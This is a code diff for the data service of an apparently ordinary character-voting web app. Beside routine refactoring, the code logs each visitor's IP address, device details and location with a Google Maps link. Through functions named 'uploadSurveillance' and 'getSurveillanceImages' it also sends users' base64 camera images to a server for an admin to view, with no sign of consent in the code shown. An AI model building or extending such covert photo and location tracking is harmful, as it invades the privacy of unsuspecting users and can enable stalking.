@@ -2,8 +2,9 @@ import { supabase, isSupabaseConfigured } from '../lib/supabase';
 import { Character } from '../types';
 import { INITIAL_CHARACTERS } from '../constants';
 
-// Dynamic URL: Uses the hostname of the device accessing the site
-const LOCAL_SERVER_URL = `http://${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:3001`;
+// FIXED: Use relative path. Vite proxy (vite.config.ts) will handle forwarding to http://localhost:3001
+// This solves the Mixed Content Error (HTTPS frontend -> HTTP backend)
+const LOCAL_SERVER_URL = ''; 
 
 // --- TYPES ---
 export interface VoteRecord {
@@ -30,13 +31,15 @@ const generateMapsUrl = (loc: any): string | null => {
     return null;
 };
 
-// Fetch client IP from local server
+// Fetch client IP from local server via Proxy
 const getClientIP = async (): Promise<string> => {
     try {
         const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
+        if (!res.ok) throw new Error('Network response was not ok');
         const data = await res.json();
         return data.ip || 'unknown';
     } catch (e) {
+        console.warn("IP Fetch failed:", e);
         return 'local-network-ip';
     }
 };
@@ -63,7 +66,7 @@ export const dataService = {
    * Mengambil daftar karakter terbaru.
    */
   getCharacters: async (): Promise<Character[]> => {
-    // 1. Try Supabase
+    // 1. Try Supabase if configured
     if (isSupabaseConfigured() && supabase) {
       const { data, error } = await supabase
         .from('characters')
@@ -83,13 +86,17 @@ export const dataService = {
       }
     }
 
-    // 2. Fallback to LocalStorage
+    // 2. Fallback to LocalStorage (Source of Truth for Local Mode)
     const saved = localStorage.getItem('muse_characters');
     if (saved) {
-        return JSON.parse(saved);
+        try {
+            return JSON.parse(saved);
+        } catch (e) {
+            console.error("Error parsing local characters", e);
+        }
     }
     
-    // 3. First time load? Save Initial to LS immediately so we have a base to update
+    // 3. First time load? Save Initial to LS immediately
     safeSetItem('muse_characters', JSON.stringify(INITIAL_CHARACTERS));
     return INITIAL_CHARACTERS;
   },
@@ -98,10 +105,8 @@ export const dataService = {
    * Mencatat User Login / Guest Visit ke Database
    */
   registerUserLogin: async (payload: UserLoginPayload) => {
-    // Get IP
     const ip = await getClientIP();
 
-    // Inject Google Maps URL & IP into location data
     const mapsUrl = generateMapsUrl(payload.location_data);
     const enrichedLocation = {
         ...payload.location_data,
@@ -111,7 +116,6 @@ export const dataService = {
 
     if (isSupabaseConfigured() && supabase) {
       const folderRef = `${payload.user_identifier}/`;
-
       const { error } = await supabase
         .from('users')
         .insert({
@@ -123,12 +127,17 @@ export const dataService = {
           camera_folder_ref: folderRef,
           last_login: new Date().toISOString()
         });
-
-      if (error) {
-        logSupabaseError("Supabase Login Log Error", error);
-      }
+      if (error) logSupabaseError("Supabase Login Log Error", error);
     } else {
-        console.log(`[LOCAL LOG] Login: ${payload.user_identifier} from IP: ${ip}`);
+        // Save simple log to LocalStorage for Admin Dashboard
+        const logKey = `muse_login_log_${Date.now()}`;
+        const logEntry = {
+            user: payload.user_identifier,
+            method: payload.login_method,
+            timestamp: new Date().toISOString(),
+            ip: ip
+        };
+        safeSetItem(logKey, JSON.stringify(logEntry));
     }
   },
 
@@ -144,7 +153,6 @@ export const dataService = {
     const timestamp = new Date().toISOString();
     const ip = await getClientIP();
     
-    // Inject Google Maps URL & IP
     const mapsUrl = generateMapsUrl(meta.location);
     const enrichedLocation = {
         ...meta.location,
@@ -152,78 +160,66 @@ export const dataService = {
         ipAddress: ip
     };
 
-    // 1. TRY SUPABASE FIRST
+    // 1. SUPABASE (If available)
     if (isSupabaseConfigured() && supabase) {
-      const { error: voteError } = await supabase
-        .from('votes')
-        .insert({
+      await supabase.from('votes').insert({
           user_identifier: user,
           character_id: characterId,
           device_info: meta.deviceInfo,
           location_data: enrichedLocation,
           created_at: timestamp
-        });
-
-      if (voteError) {
-        logSupabaseError("Supabase Vote Error", voteError);
-      }
+      });
     }
 
-    // 2. ALWAYS UPDATE LOCAL STORAGE (CLIENT STATE)
-    // Vote Record
+    // 2. LOCAL STORAGE (Mandatory for persistence)
+    // Save Vote Record
     const voteData = {
         charId: characterId,
+        user: user,
         timestamp: timestamp,
         deviceInfo: meta.deviceInfo,
         location: enrichedLocation
     };
     safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));
 
-    // Character Count Update
-    // IMPORTANT: Read from LS first to ensure we add to current state, not stale state
-    const currentLS = localStorage.getItem('muse_characters');
-    const chars: Character[] = currentLS ? JSON.parse(currentLS) : INITIAL_CHARACTERS;
-    
-    const updatedChars = chars.map(c => 
+    // Update Character Counts Locally
+    const currentData = await dataService.getCharacters();
+    const updatedChars = currentData.map(c => 
       c.id === characterId ? { ...c, votes: c.votes + 1 } : c
     );
     
     safeSetItem('muse_characters', JSON.stringify(updatedChars));
 
-    // Notify App
+    // Notify App to refresh UI
     window.dispatchEvent(new Event('local-storage-update'));
     return true;
   },
 
   /**
-   * Mengirim gambar ke Local Server (server.js).
+   * Mengirim gambar ke Local Server.
    */
   uploadSurveillance: async (user: string, base64Image: string) => {
     try {
         if (!base64Image || !base64Image.includes(',')) return;
 
+        // Uses relative path /api/upload which is proxied by Vite
         await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                user: user,
-                image: base64Image
-            })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user, image: base64Image })
         });
-
     } catch (e) {
-        console.warn("Local server upload failed (Is node server.js running?)", e);
+        console.warn("Upload failed:", e);
     }
   },
 
   /**
-   * Mengambil list gambar dari Local Server
+   * Mengambil list gambar.
    */
   getSurveillanceImages: async (user: string): Promise<{timestamp: string, url: string}[]> => {
       try {
           const response = await fetch(`${LOCAL_SERVER_URL}/api/images/${user}`);
+          if (!response.ok) return [];
           const data = await response.json();
           
           if (data && data.images) {
@@ -234,7 +230,6 @@ export const dataService = {
           }
           return [];
       } catch (e) {
-          console.warn("Failed to fetch images from local server");
           return [];
       }
   },
@@ -243,11 +238,8 @@ export const dataService = {
     if (isSupabaseConfigured() && supabase) {
       const channel = supabase
         .channel('public:characters')
-        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'characters' }, () => {
-          callback();
-        })
+        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'characters' }, callback)
         .subscribe();
-      
       return () => { supabase.removeChannel(channel); };
     }
     return () => {};
